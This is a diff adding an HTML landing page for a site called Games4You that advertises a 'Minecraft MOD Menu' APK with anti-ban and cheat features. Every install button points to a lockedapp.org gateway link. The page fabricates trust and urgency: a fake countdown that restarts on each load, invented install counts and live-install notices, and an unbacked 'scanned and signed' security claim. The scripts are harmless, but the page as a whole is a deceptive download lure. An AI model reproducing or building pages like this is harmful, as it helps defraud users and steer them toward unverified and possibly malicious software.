@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Minecraft MOD Menu — Install | Games4You</title>
+
+  <!-- Fonts & Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+
+  <meta name="description" content="Download Minecraft MOD Menu 2025 — optimized for Android 8+ | MOD Menu, anti-ban, infinite resources.">
+
+  <style>
+    /* ====== COLORS & TYPO ====== */
+    :root{
+      --bg:#071027;
+      --card:#0f2540;
+      --glass: rgba(255,255,255,0.04);
+      --accent: #28f0b6;
+      --accent-2:#5be0ff;
+      --muted: #9fb0c9;
+      --text:#e8f1fb;
+      --radius:14px;
+      --maxw:960px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      background: radial-gradient(1200px 600px at 10% 10%, rgba(40,240,182,0.06), transparent 8%),
+                  radial-gradient(1000px 500px at 90% 90%, rgba(91,224,255,0.03), transparent 10%),
+                  var(--bg);
+      font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
+      color:var(--text);
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      line-height:1.4;
+      -webkit-tap-highlight-color:transparent;
+    }
+
+    /* ====== LAYOUT ====== */
+    .wrap{
+      max-width:var(--maxw);
+      margin:20px auto 120px;
+      padding:22px;
+    }
+
+    header{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:12px;
+      margin-bottom:18px;
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+    .logo {
+      width:46px;height:46px;border-radius:10px;
+      background:linear-gradient(135deg,var(--accent),var(--accent-2));
+      display:flex;align-items:center;justify-content:center;
+      font-weight:800;color:#01303a;font-size:18px;
+      box-shadow:0 6px 24px rgba(40,240,182,0.14);
+    }
+    .brand h1{font-size:18px;margin:0;font-weight:700;letter-spacing:0.2px}
+    .brand p{margin:0;font-size:12px;color:var(--muted)}
+
+    /* HERO: mobile-first */
+    .hero{
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
+      border-radius:var(--radius);
+      padding:18px;
+      display:flex;
+      gap:14px;
+      align-items:center;
+      box-shadow: 0 8px 36px rgba(2,8,23,0.6);
+      overflow:hidden;
+      position:relative;
+    }
+
+    .hero-left{
+      width:44%;
+      min-width:120px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+
+    .hero-left img{
+      width:100%;
+      border-radius:12px;
+      display:block;
+      box-shadow:0 12px 40px rgba(3,6,12,0.6);
+    }
+
+    .hero-right{
+      width:56%;
+      padding:6px 4px;
+    }
+
+    .kicker{font-size:12px;color:var(--muted);font-weight:600;margin-bottom:6px}
+    .title{font-size:20px;margin:0 0 6px;font-weight:800;letter-spacing:-0.3px}
+    .subtitle{color:var(--muted);font-size:13px;margin:0 0 12px}
+
+    /* appmeta row */
+    .meta{
+      display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px;
+    }
+    .chip{
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), transparent);
+      padding:7px 10px;border-radius:10px;font-size:13px;color:var(--muted);
+      display:inline-flex;align-items:center;gap:8px;border:1px solid rgba(255,255,255,0.03)
+    }
+    .chip i{color:var(--accent); font-size:14px}
+
+    /* CTA group */
+    .cta-row{
+      display:flex;gap:10px;align-items:center;flex-wrap:wrap;
+    }
+    .btn-primary{
+      background:linear-gradient(90deg,var(--accent),var(--accent-2));
+      color:#04242a;padding:12px 18px;border-radius:12px;font-weight:800;
+      text-decoration:none;font-size:15px;box-shadow:0 8px 30px rgba(40,240,182,0.16);
+      display:inline-flex;align-items:center;gap:10px;
+    }
+    .btn-ghost{
+      border:1px solid rgba(255,255,255,0.06);
+      color:var(--text);padding:11px 14px;border-radius:12px;text-decoration:none;font-size:14px;
+      background:transparent;
+    }
+    .small-note{font-size:12px;color:var(--muted);margin-top:8px}
+
+    /* TOP PROOF BAR */
+    .proof-bar{
+      margin:18px 0 12px;display:flex;gap:10px;align-items:center;justify-content:space-between;
+      background: linear-gradient(180deg, rgba(255,255,255,0.01), transparent);
+      padding:10px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);
+    }
+    .proof-left{display:flex;gap:12px;align-items:center}
+    .proof-left .stat{font-size:14px;font-weight:700}
+    .proof-left .muted{font-size:13px;color:var(--muted);font-weight:600}
+
+    /* ROTATING TESTIMONIALS (small) */
+    .ticker{
+      display:flex;gap:8px;align-items:center;
+    }
+    .pill{background:rgba(255,255,255,0.02);padding:8px 12px;border-radius:999px;font-size:13px;color:var(--muted);display:inline-flex;align-items:center;gap:8px}
+
+    /* FEATURES GRID */
+    .grid{
+      margin-top:18px;display:grid;grid-template-columns:repeat(2,1fr);gap:10px;
+    }
+    .card{
+      background:var(--card);padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);
+      box-shadow: 0 6px 20px rgba(2,8,23,0.6);
+    }
+    .card h3{margin:0;font-size:14px;font-weight:700}
+    .card p{margin:6px 0 0;color:var(--muted);font-size:13px}
+
+    /* SCREENSHOT / CAROUSEL */
+    .carousel{
+      margin-top:16px;display:flex;gap:10px;align-items:center;
+    }
+    .shot{
+      width:120px;height:200px;border-radius:12px;background-size:cover;background-position:center;
+      box-shadow:0 10px 30px rgba(2,8,23,0.6);border:1px solid rgba(255,255,255,0.03)
+    }
+
+    /* COUNTDOWN + LEVERAGE */
+    .countdown{
+      margin-top:12px;background:linear-gradient(90deg, rgba(40,240,182,0.04), rgba(91,224,255,0.02));
+      padding:12px;border-radius:12px;display:flex;gap:12px;align-items:center;justify-content:space-between;
+      border:1px solid rgba(255,255,255,0.03);
+    }
+    .countdown .label{font-size:13px;color:var(--muted)}
+    .timer{font-weight:800;font-size:18px;color:var(--text)}
+
+    /* Sticky mobile CTA */
+    .sticky-cta{
+      position:fixed;left:12px;right:12px;bottom:12px;padding:10px;background:linear-gradient(90deg,var(--accent),var(--accent-2));
+      color:#04242a;border-radius:14px;display:flex;gap:12px;align-items:center;justify-content:space-between;z-index:9999;
+      box-shadow:0 20px 50px rgba(40,240,182,0.16);
+      transform:translateY(0);transition:transform .25s ease;
+    }
+    .sticky-cta .label{font-weight:800}
+    .sticky-cta .sub{font-size:12px;color:rgba(4,36,42,0.8)}
+    .sticky-cta a{color:#04242a;text-decoration:none;font-weight:800;padding:10px 14px;background:rgba(255,255,255,0.9);border-radius:10px}
+
+    /* FOOTER */
+    footer{margin-top:30px;color:var(--muted);font-size:13px;text-align:center;padding:18px 10px}
+
+    /* ====== RESPONSIVE ADJUSTMENTS ====== */
+    @media(min-width:700px){
+      .wrap{margin-top:36px}
+      .hero{padding:24px}
+      .title{font-size:24px}
+      .grid{grid-template-columns:repeat(4,1fr)}
+      .hero-left{width:38%}
+      .hero-right{width:62%}
+      .carousel .shot{width:140px;height:240px}
+    }
+    @media(min-width:1024px){
+      .wrap{margin-top:52px}
+    }
+
+    /* small animations */
+    .fade-in{animation:fadeIn .7s ease both}
+    @keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+  </style>
+</head>
+<body>
+
+  <div class="wrap fade-in">
+
+    <!-- HEADER -->
+    <header>
+      <div class="brand">
+        <div class="logo">G4Y</div>
+        <div>
+          <h1>Games4You</h1>
+          <p>MOD Menu • Android 8+ • 1.21.1</p>
+        </div>
+      </div>
+
+      <div style="display:flex;gap:8px;align-items:center">
+        <a class="btn-ghost" href="#install" title="Install"><i class="fa-solid fa-download"></i>&nbsp; Install</a>
+      </div>
+    </header>
+
+    <!-- HERO -->
+    <section class="hero" aria-label="hero">
+      <div class="hero-left" role="img" aria-hidden="true">
+        <img src="https://i.postimg.cc/SNW3jVCh/e2-Pl4g-ZB-400x400.jpg" alt="Minecraft MOD Menu screenshot">
+      </div>
+
+      <div class="hero-right">
+        <div class="kicker">Optimized version — Highly popular</div>
+        <h2 class="title">Minecraft — MOD Menu (Anti-Ban, Infinite Resources)</h2>
+        <p class="subtitle">Minecraft (MOD Menu) is an Android and iOS game that takes players into a limitless world of creativity and adventure. The game is set in a procedurally generated 3D world made of blocks that players can mine, craft, and build freely. In survival mode, players explore the world, gather resources, and fight monsters at night. In peace mode, monsters disappear, allowing full creative freedom. Players can build everything from simple houses to intricate castles, vast cities, and even working machines. The crafting system allows converting raw materials into tools, weapons, and building blocks, giving endless creative possibilities.</p>
+
+        <div class="meta">
+          <div class="chip"><i class="fa-solid fa-mobile-screen-button"></i> Android & iOS</div>
+          <div class="chip"><i class="fa-solid fa-flash"></i> 130.2 MB</div>
+          <div class="chip"><i class="fa-solid fa-star"></i> 4.8 / 5 (56k+)</div>
+        </div>
+
+        <div class="cta-row">
+          <a id="install" href="https://lockedapp.org/cl/i/6ndmnj" class="btn-primary" onclick="trackClick('install')">
+            <i class="fa-solid fa-download"></i> Install Now
+          </a>
+          <a href="#" class="btn-ghost" onclick="openQuickModal(); return false;"><i class="fa-solid fa-shield-halved"></i> Security Details</a>
+        </div>
+
+        <div class="proof-bar">
+          <div class="proof-left">
+            <div>
+              <div class="stat">+120k installs</div>
+              <div class="muted">this month</div>
+            </div>
+            <div style="width:10px"></div>
+            <div>
+              <div class="stat">98% retention</div>
+              <div class="muted">satisfied users</div>
+            </div>
+          </div>
+          <div class="ticker">
+            <div class="pill"><i class="fa-solid fa-user-check" style="color:var(--accent)"></i> 2,345 people installed 3m ago</div>
+          </div>
+        </div>
+
+        <div class="countdown">
+          <div>
+            <div class="label">Special offer</div>
+            <div class="timer" id="timer">00:59:59</div>
+          </div>
+          <div style="text-align:right">
+            <div class="label">Bonus pack</div>
+            <div class="muted">Includes skins + free resources</div>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- FEATURES & CARDS -->
+    <section class="grid" aria-label="features">
+      <div class="card">
+        <h3><i class="fa-solid fa-shield feature" style="color:var(--accent)"></i> Built-in Anti-Ban</h3>
+        <p>Active protection for online play without risk (2025 update).</p>
+      </div>
+
+      <div class="card">
+        <h3><i class="fa-solid fa-infinity" style="color:var(--accent)"></i> Unlimited Resources</h3>
+        <p>Enhanced creative mode — get blocks and items without limits.</p>
+      </div>
+
+      <div class="card">
+        <h3><i class="fa-solid fa-rocket" style="color:var(--accent)"></i> Optimized Performance</h3>
+        <p>Lightweight and faster version for low-end mobile devices.</p>
+      </div>
+
+      <div class="card">
+        <h3><i class="fa-solid fa-cogs" style="color:var(--accent)"></i> Full MOD Menu</h3>
+        <p>Quick access to commands, fly, ESP, and more — simple interface.</p>
+      </div>
+    </section>
+
+    <!-- LEGAL + FOOTER -->
+    <footer>
+      <div style="max-width:700px;margin:auto">
+        <div style="font-size:13px;color:var(--muted)">Note: This MOD is a community modification. Games4You is a redistribution platform for modded APKs. Make sure you have backups. By installing, you agree to the terms.</div>
+        <div style="margin-top:10px">© Games4You — 2025</div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- STICKY CTA (MOBILE) -->
+  <div id="sticky" class="sticky-cta" role="dialog" aria-label="install now">
+    <div>
+      <div class="label">Install — Minecraft MOD</div>
+      <div class="sub">Android 8+ • 130 MB</div>
+    </div>
+    <div>
+      <a href="https://lockedapp.org/cl/i/6ndmnj" onclick="trackClick('sticky_install')">Install</a>
+    </div>
+  </div>
+
+  <!-- QUICK MODAL (security / lead) -->
+  <div id="quickModal" style="display:none;position:fixed;inset:0;background:rgba(1,6,15,0.6);z-index:99999;align-items:center;justify-content:center;padding:20px">
+    <div style="max-width:420px;width:100%;background:linear-gradient(180deg, rgba(255,255,255,0.02), transparent);border-radius:14px;padding:18px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 20px 60px rgba(0,0,0,0.6)">
+      <h3 style="margin:0 0 6px">Security Details</h3>
+      <p style="margin:0 0 10px;color:var(--muted)">Version scanned and signed. Avoid unknown sources other than the install link. Backup your worlds before installing.</p>
+
+      <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px">
+        <a href="#" onclick="closeQuickModal(); return false;" class="btn-ghost">Close</a>
+        <a href="https://lockedapp.org/cl/i/6ndmnj" class="btn-primary" onclick="trackClick('modal_install')">Download</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ====== SCRIPTS: timer + small behaviors ====== -->
+  <script>
+    (function(){
+      const target = Date.now() + 60*60*1000;
+      const el = document.getElementById('timer');
+      function update(){
+        const now = Date.now();
+        let diff = Math.max(0, target - now);
+        const h = Math.floor(diff/3600000); diff -= h*3600000;
+        const m = Math.floor(diff/60000); diff -= m*60000;
+        const s = Math.floor(diff/1000);
+        el.textContent = (h).toString().padStart(2,'0')+':'+(m).toString().padStart(2,'0')+':'+(s).toString().padStart(2,'0');
+        if(target - now > 0) requestAnimationFrame(update);
+      }
+      update();
+    })();
+
+    (function(){
+      const sticky = document.getElementById('sticky');
+      function adapt(){
+        if(window.innerWidth > 768) sticky.style.display = 'none';
+        else sticky.style.display = 'flex';
+      }
+      adapt();
+      window.addEventListener('resize', adapt);
+    })();
+
+    function openQuickModal(){
+      document.getElementById('quickModal').style.display = 'flex';
+      trackClick('open_quick_modal');
+    }
+    function closeQuickModal(){ document.getElementById('quickModal').style.display = 'none'; }
+
+    function trackClick(name){
+      try{
+        console.log('track:', name);
+      }catch(e){}
+    }
+
+    document.addEventListener('keydown', function(e){ if(e.key === 'Escape'){ closeQuickModal(); }});
+
+    document.querySelectorAll('a[href^="#"]').forEach(a=>{
+      a.addEventListener('click', function(e){
+        const target = document.querySelector(this.getAttribute('href'));
+        if(target){ e.preventDefault(); target.scrollIntoView({behavior:'smooth', block:'start'}); }
+      });
+    });
+  </script>
+</body>
+</html>
